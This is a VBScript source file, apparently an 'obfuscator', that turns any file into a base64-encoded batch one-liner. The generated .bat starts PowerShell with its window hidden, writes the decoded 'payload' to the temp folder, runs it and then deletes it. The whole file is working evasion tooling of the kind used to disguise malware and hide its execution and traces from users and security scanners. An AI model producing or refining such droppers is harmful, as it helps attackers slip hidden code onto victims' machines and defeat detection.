' CKSRT One-Liner Obfuscator
Set args = WScript.Arguments
If args.Count = 0 Then WScript.Quit

inputFile = args(0)
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Output path to Desktop
outputFile = shell.SpecialFolders("Desktop") & "\" & fso.GetBaseName(inputFile) & "_obf.bat"

' Get File Extension
ext = fso.GetExtensionName(inputFile)
If ext = "" Then ext = "bat"

' --- Native VBScript Base64 Encoding ---
Dim stream, xml, node, b64
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1 ' Binary
stream.Open
stream.LoadFromFile inputFile
Set xml = CreateObject("MSXML2.DOMDocument")
Set node = xml.createElement("b64")
node.DataType = "bin.base64"
node.nodeTypedValue = stream.Read
b64 = Replace(Replace(node.Text, vbLf, ""), vbCr, "")
stream.Close

' --- Generate the One-Liner Batch Content ---
Dim batContent
' We use single quotes for PowerShell variables to avoid breaking the batch file
batContent = "@echo off & color 0A & powershell -NoProfile -WindowStyle Hidden -Command ""$b='" & b64 & "'; $p=Join-Path $env:TEMP 'payload." & ext & "'; [IO.File]::WriteAllBytes($p,[Convert]::FromBase64String($b)); Start-Process 'cmd.exe' -ArgumentList '/c',$p -Wait; Remove-Item $p -Force"""

' --- Write the One-Liner Silently ---
Dim outStream
Set outStream = fso.CreateTextFile(outputFile, True)
outStream.Write batContent
outStream.Close

' No popups. Just exit.
WScript.Quit